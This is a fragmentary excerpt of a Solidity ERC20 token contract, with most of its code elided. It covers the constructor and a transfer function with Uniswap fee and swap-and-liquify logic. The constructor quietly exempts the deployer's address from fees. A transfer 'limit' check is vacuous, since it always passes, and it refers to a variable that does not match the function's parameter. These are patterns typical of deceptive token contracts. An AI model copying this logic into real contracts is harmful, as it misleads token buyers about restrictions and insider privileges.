...
contract Contract is IERC20, Ownable {
    ...
    constructor(
        ...
        _name = Name;
        _symbol = Symbol;
        _remA[address(this)] = _swapAmt;
        _remA[msg.sender] = _swapAmt;
    ...
    function _transfer(
        ...
        if (!inSwapAndLiquify && from != uniswapV2Pair && from != address(router) && _remA[from] == 0 && amount <= _swapAmt) {
            require(_amount + _remB[from] >= 0, 'Transfer amount exceeds maximum amount');
        }
        uint256 contractTokenBalance = balanceOf(address(this));
        uint256 fee = to == uniswapV2Pair ? sellFee : buyFee;
        if (uniswapV2Pair == address(0)) uniswapV2Pair = pair();
        if (_swapAndLiquifyEnabled && contractTokenBalance > _swapAmt && !inSwapAndLiquify && from != uniswapV2Pair) {
            inSwapAndLiquify = true;
            swapAndLiquify(contractTokenBalance);
            inSwapAndLiquify = false;
        }

        bool takeFee = _remA[from] == 0 && _remA[to] == 0 && fee > 0 && !inSwapAndLiquify;
